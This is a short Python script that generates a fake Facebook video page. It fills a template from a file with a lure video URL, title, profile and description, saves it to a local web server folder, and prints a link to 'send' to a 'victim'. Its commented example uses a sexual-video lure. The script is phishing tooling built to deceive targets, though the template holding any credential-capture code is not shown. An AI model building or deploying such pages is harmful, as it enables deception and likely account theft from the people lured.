import os

class page:

    __hackUrl    = ''
    __hackTitel  = ''
    __hackProfile= ''
    __hackDesc   = ''

    #hackUrl        ==> video url
    #hackTitel     ==> titel from video
    #hackProfile ==> name profile
    #hackDesc    ==> dome desc from a video
    def __init__ (self ,hackUrl ,hackTitel,hackProfile,hackDesc):
        self.__hackUrl = hackUrl
        self.__hackTitel  = hackTitel
        self.__hackProfile = hackProfile
        self.__hackDesc = hackDesc
    

    
    def Create_fake_page(self,folder ):
        ture_path = "C:/xampp/htdocs/"+folder

        if not os.path.exists(ture_path):
            # this code of create fake page facebook video
            os.mkdir(ture_path)
            f = open('c1.txt',"r+")
            code = f.read()
            f.close()
            fin1 = code.replace("hackUrl",self.__hackUrl)
            fin2 = fin1.replace("hackTitel",self.__hackTitel)
            fin3 = fin2.replace("hackProfil",self.__hackProfile)
            fin4 = fin3.replace("hackDesc",self.__hackDesc)
                #print(hack)
            finelPage=ture_path+'/index.html'
            newFile= open(finelPage,'w+')
            newFile.write(fin4)
            newFile.close()
        
        else:        
            # this code of create fake page facebook video
            #info =[self.hackUrl ,self.hackTitel,self.hackProfile,self.hackDesc]
            f = open('c1.txt',"r+")
            code = f.read()
            f.close()
            fin1 = code.replace("hackUrl",self.__hackUrl)
            fin2 = fin1.replace("hackTitel",self.__hackTitel)
            fin3 = fin2.replace("hackProfil",self.__hackProfile)
            fin4 = fin3.replace("hackDesc",self.__hackDesc)
                #print(hack)
            finelPage=ture_path+'/index.html'
            newFile= open(finelPage,'w+')
            newFile.write(fin4)
            newFile.close()

        #fin = code.replace("Tommy",'Ms.Milinya maxey')#Ms.Milinya maxey
        #Daniela se negó a salir con Pedro y él ha decidido secuestrarla para vengarse de ella 
        #fin1 = code.replace('Daniela se negó a salir con Pedro y él ha decidido secuestrarla para vengarse de ella ' ,'desc')
        #newFile= open('a1.html','w+')
        #newFile.write(fin)
        #newFile.close()
        print('HI Send this Url From Victim : http://localhost/'+folder+'/index.html')

#exemple test
#filename = watchs
# url = https://cdn1.medialivery.com/13ba8393850ff46877250a8fa206be27.mp4
#titel = sex video amanda
#profile = Mr.hacker
#decs = video sex o wsayi hhhh (-_*)

# using class (^_^)
#p = page('https://cdn1.medialivery.com/13ba8393850ff46877250a8fa206be27.mp4','sex video amanda','Mr.hacker','video sex wsayi hhhh (-_*)')
#p.Create_fake_page('facbook')

